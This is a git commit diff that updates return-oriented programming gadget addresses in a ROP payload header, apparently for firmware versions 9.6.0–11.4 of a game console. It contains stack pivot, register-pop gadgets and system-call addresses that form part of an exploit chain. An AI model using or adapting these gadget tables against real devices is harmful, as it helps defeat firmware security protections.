b519ae4b44abd503f0a39a8b5e677f734123d8aa
Stefan Schnitzler <41997317+deadphoenix8091@users.noreply.github.com>
2019-10-09 23:25:34 +0200

    Update rop gadgets for 9.6.0-11.4 support

--- rop_payload/rop_gadgets.h
+++ rop_payload/rop_gadgets.h
@@ -4,28 +4,28 @@
 #define WBUFF	0x00681000
 #define ENTRY 	0x0ffffe48
 
-#define POP_R0PC 0x00146760
-#define POP_R1PC 0x001d53f8
-#define POP_R2PC 0x00207d31
-#define POP_R3PC 0x0010d44c
-#define POP_R4R8PC 0x0010d20c
-#define ROP_POPR3_ADDSPR3_POPPC 0x0014660c + 4
+#define POP_R0PC 0x00146720 //0x00146760
+#define POP_R1PC 0x001d52C4 //0x001d53f8
+#define POP_R2PC 0x001BAF48// 0x00207d31
+#define POP_R3PC 0x0010D40C //ok
+//#define POP_R4R8PC 0x0010d20c
+#define ROP_POPR3_ADDSPR3_POPPC 0x001465CC + 4 //001465CC
 #define STACK_PIVOT ROP_POPR3_ADDSPR3_POPPC
 #define PIVOT_OFFSET -0x110
-#define ROP_MOV_R3_R6_BLX_ADDRR5 0x001264AC
-#define ROP_STR_R12R0  0x0010df64
-#define ROP_MOV_R1_0 0x0019DFB4       			@sp!,{ r4 pc }
-#define ROP_MOV_R3_4_JUNKTOR0 0x001317A4 @ LDMFD  	SP!, {R4-R8,PC}
-#define ROP_MOV_R2_4_BLX_R3 0x00104bbc
+#define ROP_MOV_R3_R6_BLX_ADDRR5 0x0012646C
+#define ROP_STR_R12R0  0x0010DF24 
+#define ROP_MOV_R1_0 0x0019DEFC       			@sp!,{ r4 pc }
+#define ROP_MOV_R3_4_JUNKTOR0 0x00131764 @ LDMFD  	SP!, {R4-R8,PC}
+#define ROP_MOV_R2_4_BLX_R3 0x00104B8C
 
-#define svcSleepThread 0x001bdbd0
-#define STR_YS 0x0028cb60
+#define svcSleepThread 0x001BDACC
+//#define STR_YS 0x0028cb60
 #define GARBAGE 0xADDEADDE
 #define NULL 0
 #define GSPGPU_SERVHANDLEADR 0x002993c4
-#define GSPGPU_WriteHWRegs 0x00136200      		@sp!,{ r4 pc }
-#define GSPGPU_SetLcdForceBlack 0x001c13a4  		@sp!,{ r4-r6 pc }
+#define GSPGPU_WriteHWRegs 0x001361C0      		@sp!,{ r4 pc }
+//#define GSPGPU_SetLcdForceBlack 0x001c13a4  		@sp!,{ r4-r6 pc }
 #define MAGENTA_ADDR 0x002A800C
-#define HWREGS_ADDR 0x00202A04 
+#define HWREGS_ADDR 0x00101418 // 0x00202A04  
 
-#define AM_TwlExport 0x00156d28 + 0x10
+#define AM_TwlExport 0x00156CE8 + 0x10
